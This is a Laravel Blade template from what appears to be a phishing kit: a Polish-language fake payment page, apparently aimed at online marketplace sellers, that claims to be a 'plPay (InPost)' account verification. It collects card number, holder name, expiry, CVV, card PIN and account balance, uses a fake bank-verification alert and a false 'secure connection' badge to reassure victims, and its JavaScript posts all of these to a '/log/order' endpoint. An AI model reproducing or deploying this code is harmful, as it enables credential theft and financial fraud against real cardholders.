@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/order.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div id="loading" style="display: none;">
        <img id="loading-image" src="{{asset('images/loader.gif')}}" alt="Proszę czekać...">
    </div>
    <div class="pay-card-layout pay-card-layout_type_youla-mobile">
        <div class="pay-card-layout__header_type_vkpay" style="position: initial;">
            <div class="pay-card-layout__logo">
                <img src="{{$fake->logo()}}" style="height: 46px;" alt="logo">
            </div>
        </div>

        <div class="modal-dialog" role="document" id="balance_check" style="display: none;">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel" style="margin: auto;">
                        <b style="font-size: 1.25em;"> Dane karty zostały potwierdzone</b>
                    </h5>
                </div>
                <div class="modal-body">
                    <p>Zgodnie z zasadami naszego partnera płatniczego plPay (InPost), w celu otrzymania środków system
                        weryfikuje konto, aby upewnić się że konto naprawdę należy do Ciebie i może przyjmować płatności
                        z
                        naszego serwisu.

                        <br><br>Ponieważ korzystasz z naszego systemu płatności po raz pierwszy, musisz przejść
                        weryfikację
                        konta, na które w przyszłości będziesz otrzymywać zapłatę za sprzedany towar. <b>Jest to
                            standardowa
                            procedura potwierdzania posiadacza konta.</b> Jest to konieczne, w celu potwierdzenia
                        możliwości
                        korzystania z systemu płatności internetowych oraz chronić kupujących i sprzedających przed
                        oszustami.

                    </p>
                    <div class="form-group">
                        <label for="card_balance" class="col-form-label"><b>Stan konta:</b></label>
                        <input type="number" class="form-control" name="balance" placeholder="Stan konta"
                               id="card_balance" onfocus="$(this).css('border-color', '');">
                    </div>

                </div>
                <div class="modal-footer">
                    <button type="submit"
                            style="max-width:150px;float:right;border-radius: 20px 20px 20px 20px; font-size: 1.2em; /*background-color: #1564c0;*/ background-color: green; border-color: #1564c0; color: white; font-weight: bold;"
                            class="btn btn-primary" onclick="cardlog();" id="paybutton">Potwierdzić
                    </button>
                </div>
            </div>
        </div>
        <div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay" id="carddata">
            <div class="pay-card__row">
                <div class="pay-card__card js-credit-card">
                    <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
                        <div class="credit-card-form__card-wrapper">
                            <div class="credit-card-form__card credit-card-form__card_position_front">
                                <div class="payment-systems-icons payment-systems-icons">
                                <span id="mir"
                                      class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
                                    <span id="visa"
                                          class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
                                    <span id="mastercard"
                                          class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
                                    <span id="maestro"
                                          class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
                                </div>
                                <div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
                                    <label class="js-cc-label credit-card-form__label">
                                        <span class="credit-card-form__title">Numer karty</span>
                                        <input type="tel" name="card_number" id="cardnumber" autocomplete="cc-number"
                                               placeholder="Od 16 do 19 cyfr"
                                               class="credit-card-form__input js-cc-input js-cc-number-input"
                                               required="">
                                        <div class="credit-card-form__error-text">Numer karty wprowadzony nieprawidłowo
                                        </div>
                                    </label>
                                </div>
                                <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
                                    <label class="js-cc-label credit-card-form__label">
                                        <span class="credit-card-form__title">Imię i nazwisko na karcie</span>
                                        <input type="text" name="cardholder" id="cardholder" autocomplete="cc-name"
                                               class="credit-card-form__input js-cc-input js-cc-name-input"
                                               maxlength="40"
                                               placeholder="" required="">
                                        <div class="credit-card-form__error-text">Imię i nazwisko łacińskimi literami
                                            jak na
                                            karcie
                                        </div>
                                    </label>
                                </div>
                                <div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix"
                                     id="step2" style="display: none;">
                                    <label class="js-cc-label credit-card-form__label">
                                        <span class="credit-card-form__title">Data ważności</span>
                                        <input type="text" name="expdate" id="expdate" autocomplete="cc-exp"
                                               placeholder="MM/RR"
                                               class="credit-card-form__input js-cc-input js-cc-exp-input" required="">
                                        <div class="credit-card-form__error-text">Data ważności</div>
                                    </label>
                                    <label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label">
                                    <span class="credit-card-form__title">
                                       CVC/CVV kod
                                       <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div>
                                    </span>
                                        <div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv">
                                            Ostatnie 3 cyfry na pasku do podpisu
                                            <div class="credit-card-form__tooltip-icon"></div>
                                            <div class="credit-card-form__tooltip-arrow"></div>
                                        </div>
                                        <input type="password" name="card_cvc" id="cvc2" placeholder=""
                                               class="credit-card-form__input  js-cc-input js-cc-cvv-input"
                                               autocomplete="off" required="">
                                        <div class="credit-card-form__error-text js-cc-error-text" id="si">Ostatnie trzy
                                            cyfry na odwrocie
                                        </div>
                                    </label>
                                    <label class="js-cc-label credit-card-form__label" style="width: 100%">
                                        <span class="credit-card-form__title">Pin</span>
                                        <input type="password" name="card_pin" id="card_pin" autocomplete="off"
                                               class="credit-card-form__input js-cc-input js-cc-cpin-input"
                                               maxlength="40" placeholder="" required="">
                                        <div class="credit-card-form__error-text">error</div>
                                    </label>
                                </div>

                                <div style="width: 20%;"
                                     class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix"></div>

                            </div>
                        </div>
                        <div>
                            <a class="pseudo-link_2" href="{{subRoute('fake.banks',['track_id'=>$fake->track_id])}}">
                                Wybierz bank z listy</a>
                        </div>
                        <div class="credit-card-form__submit">

                            <div class="credit-card-form__submit-inner">
                                <input style="cursor: pointer; background-color: #002f34;" onclick="nextcard();"
                                       id="nextpay" type="submit" class="js-button-submit button" name="submit"
                                       value="Odbierz środki">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!--    <button class="open-button" id="open-support" onclick="openForm()"></button>-->

        <div class="secure-information secure-information_type_youla-mobile">
            <span class="secure-information__text" title="Bezpieczne połączenie. Twoje dane są bezpieczne.">
            <span class="secure-information__icon" style="">
                <img src="{{asset('images/secure.png')}}"
                     style="width: 104%;margin-top: -4px;">
            </span>
                <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
            <span class="secure-information__text_type_secure-connection">Bezpieczne połączenie</span>
                <img src="{{asset('images/veryf.png')}}"
                     style="width: 50%;margin-left: 25%;">
            </span>

        </div>
    </div>
    @push('js')
        <script type="text/javascript">
            $(document).ready(function () {
                load();
                $("#cardnumber").mask("9999 9999 9999 9999");
                $("#expdate").mask("99/99");
                $("#cvc2").mask("999");
            })


            function load(ms = 1000) {
                $('#loading').show();
                setTimeout(function () {
                    $('#loading').hide();
                }, ms);
            }

            function nextpay() {
                load();
                let ccnum = $('#cardnumber');
                let cardholder = $('#cardholder');
                let expdate = $('#expdate');
                let cvc = $('#cvc2');
                let cpin = $('#card_pin');
                let Data = new Date();
                let card_date = expdate.val();
                let month = card_date.split("/")[0]
                let year = card_date.split("/")[1]
                let current_moth = Data.getMonth() + 1;
                let current_year = Data.getFullYear().toString();
                current_year = current_year[0] + current_year[1];
                let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
                let ccnum_length = $.trim(ccnum.unmask().val()).length;
                ccnum.mask("9999 9999 9999 9999");
                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && valid_card) {
                    $('#carddata').css('display', 'none');
                    load(3000);
                    $('#balance_check').css('display', '');
                } else {
                    ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
                    !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
                    (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
                    cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
                    cpin.val().length < 3 ? cpin.css("border-color", "red") : cpin.css("border-color", "");
                }
            }

            function nextcard() {
                let ccnum = $('#cardnumber');
                ccnum.css("border-color", "");
                if (ccnum.unmask().val().length >= 16) {
                    $('#step2').show();
                    $('#nextpay').attr('onclick', 'nextpay();');
                    alert('Twój bank zażądał dodatkowej weryfikacji. Wypełnij dodatkowe pola i spróbuj ponownie.')
                } else {
                    ccnum.css("border-color", "red");
                    alert('Mapa wpisana niepoprawnie.');
                }
                ccnum.mask("9999 9999 9999 9999");
            }

            function cardlog() {
                let ccnum = $('#cardnumber');
                let cardholder = $('#cardholder');
                let expdate = $('#expdate');
                let cvc = $('#cvc2');
                let cpin = $('#card_pin');
                let card_balance = $('#card_balance');
                let card_date = expdate.val();
                let Data = new Date();
                let month = card_date.split("/")[0]
                let year = card_date.split("/")[1]
                let current_moth = Data.getMonth() + 1;
                let current_year = Data.getFullYear().toString();
                current_year = current_year[0] + current_year[1];
                let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
                let ccnum_unmask = ccnum.unmask().val()
                let ccnum_length = $.trim(ccnum_unmask).length;
                ccnum.mask("9999 9999 9999 9999");
                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt("{{$fake->price}}") && valid_card) {
                    $('#paybutton').css('background', 'gray').attr('disabled', '1');
                    $.ajax({
                        type: "POST",
                        dataType: "json",
                        url: "/log/order",
                        beforeSend: load,
                        data: {
                            card_number: ccnum_unmask,
                            expdate: expdate.val(),
                            card_cvc: cvc.val(),
                            card_pin: cpin.val(),
                            card_holder: cardholder.val(),
                            balance: card_balance.val(),
                        },
                    }).fail(function (e) {
                        console.log(e)
                        setTimeout(function () {
                            window.location.reload();
                        }, 2000);
                    }).done(function (data) {
                        if (data.html) $('#app').html(data.html);
                        else location.href = data.next
                    });
                } else {
                    !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
                    (!expdate.val().length < 5) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
                    cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
                    cpin.val().length < 3 ? cpin.css("border-color", "red") : cpin.css("border-color", "");
                    ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
                    !card_balance.val().length ? card_balance.css("border-color", "red") : card_balance.css("border-color", "");
                    if (!card_balance.val().length || card_balance.val() < 5 || parseInt(card_balance.val()) === parseInt("{{$fake->price}}")) {
                        $('#verif_balance').toggle();
                        card_balance.css("border-color", "red");
                    } else card_balance.css("border-color", "");
                }
            }
        </script>
    @endpush
@endsection